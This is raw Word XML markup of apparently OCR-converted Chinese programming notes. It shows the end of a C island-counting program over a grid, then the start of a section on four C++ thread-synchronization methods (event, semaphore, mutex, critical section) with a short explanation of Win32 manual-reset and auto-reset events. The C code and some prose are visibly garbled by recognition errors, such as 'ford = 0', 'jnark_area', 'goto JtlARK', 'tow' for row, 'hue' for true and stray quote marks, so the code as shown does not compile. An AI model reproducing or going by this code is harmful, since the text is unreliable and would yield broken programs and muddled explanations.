          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>(”%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>c”, &amp;n) == EOF) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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row = i + 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1660" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>goto JtlARK;</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else if (n == ' \n‘ | | n == ' \r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>J</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="16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240" w:lineRule="auto"/>
        <w:ind w:left="1660" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">col </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">= </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>j；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1660" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>j = 0；</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else{</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1660" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">map [i] [ j ]. island = (bool) (n - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>J</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>J</w:t>
      </w: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 // end of while loop</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MARK：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>打印内容</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printf ("row = %d, col = %d\n°</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="subscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>J</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:smallCaps/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>tow,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> col);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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for(i = 0; i &lt; row; i++) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1660" w:right="0" w:hanging="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>for (j = 0; j &lt; col ;j++){ printf(°%d map [i] [j]. island);</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1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>printf("\nO;</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r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>计算岛屿数</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>*/</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int groups = 0;</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ford = 0; i &lt; row; i++) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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for(j = 0; j &lt; col ;j++){</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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 xml:space="preserve">if (map [i] [ j]. island == </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>■:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>rue) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2080" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>groups</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="920" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2080" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>map[i] [j].island = false; jnark_area(i, j);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="740" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="820" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>printf(〃％d\n“3 groups); return 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="226" w:name="bookmark235"/>
      <w:bookmarkStart w:id="227" w:name="bookmark236"/>
      <w:bookmarkStart w:id="228" w:name="bookmark237"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>37. C++</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>线程同步的四种方式</w:t>
      </w:r>
      <w:bookmarkEnd w:id="226"/>
      <w:bookmarkEnd w:id="227"/>
      <w:bookmarkEnd w:id="228"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1015"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="500"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="229" w:name="bookmark238"/>
      <w:bookmarkEnd w:id="229"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>事件</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(Event)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1015"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="500"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="230" w:name="bookmark239"/>
      <w:bookmarkEnd w:id="230"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>信号量</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(semaphore)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1015"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="500"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="231" w:name="bookmark240"/>
      <w:bookmarkEnd w:id="231"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>互斥量</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(mutex)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1015"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="500"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="232" w:name="bookmark241"/>
      <w:bookmarkEnd w:id="232"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>临界区</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(Critical section)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="233" w:name="bookmark242"/>
      <w:bookmarkEnd w:id="233"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>事件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>事件</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(Event)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>WIN32</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>提供的最灵活的线程间同步方式，事件可以处于激发状态</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="6495"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:hanging="1800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(signaled or hue)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>或未激发状态</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(unsignal or false) o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>根据状态变迁方式的不同， 事件可分为两类：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="985"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="285" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="100"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="234" w:name="bookmark243"/>
      <w:bookmarkEnd w:id="234"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>手动设置：这种对象只可能用程序手动设置，在需要该事件或者事件发生时，采 用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>SetEvent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>及</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ResetEvent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>来进行设置。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="985"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="100"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="235" w:name="bookmark244"/>
      <w:bookmarkEnd w:id="235"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>自动恢复：一旦事件发生并被处理后，自动恢复到没有事件状态，不需要再次设 置。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
